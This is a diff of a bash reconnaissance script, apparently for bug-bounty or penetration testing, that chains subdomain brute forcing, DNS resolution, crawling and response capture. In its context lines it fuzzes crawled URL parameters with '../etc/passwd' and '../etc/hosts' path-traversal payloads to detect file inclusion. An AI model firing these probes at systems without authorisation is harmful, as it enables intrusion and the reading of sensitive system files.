@@ -99,9 +99,9 @@ rm $subs_path/ghsubs.txt
 
 # PureDNS Brute Force
 echo "Brute forcing subdomains for $url"
-puredns bruteforce ~/tools/wordlists/assetnote/subs/subs.txt $url --resolvers ~/tools/resolvers/validated-new -w $subs_path/resolved.txt
-puredns resolve $subs_path/subs.txt
-dnsx -l $subs_path/resolved.txt -json -o $hosts_path/dns.json | jq -r '.a?[]?' | anew $hosts_path/ips.txt | wc -l
+puredns bruteforce ~/tools/wordlists/assetnote/subs/subs.txt $url --resolvers ~/tools/resolvers/validated-new -w $subs_path/brute.txt
+cat $subs_path/brute.txt | anew subs.txt
+dnsx -l $subs_path/subs.txt -json -o $hosts_path/dns.json | jq -r '.a?[]?' | anew $hosts_path/ips.txt | wc -l
 
 
 ### What do these subs map out to? AWS? GCP?
@@ -119,7 +119,7 @@ tew -i $portscan_path/naabu.txt -dnsx $hosts_path/dns.json -vhost | httpx -json 
 
 ### HTTP Crawling
 katana -u $hosts_path/http.txt -json -o $content_path/crawl.txt
-grep "{" | jq -r .endpoint | anew crawl.txt
+cat $content_path/crawl.txt | grep "{" | jq -r .endpoint | anew crawl.txt
 
 ### HTTP Responses
 tew -i $portscan_path/naabu.txt -dnsx $hosts_path/dns.json -vhost | httpx -sr -srd $content_path/responses
@@ -132,6 +132,8 @@ cat $content_path/crawl.txt | grep "\.js" | httpx -sr -srd $content_path/js
 ### File Inclusion
 cat crawl.txt | grep "?" | qsreplace "../../../../../etc/passwd" | ffuf -u "FUZZ" -w - -mr "^root:" -od $quick_wins/etcpasswd
 cat crawl.txt | grep "?" | qsreplace "../../../../../etc/hosts" | ffuf -u "FUZZ" -w - -mr "^127.0.0.1:" -od $quick_wins/hostsfile
+
+
 
 ### Calculate Endtime
 endtime=$(date +%s)
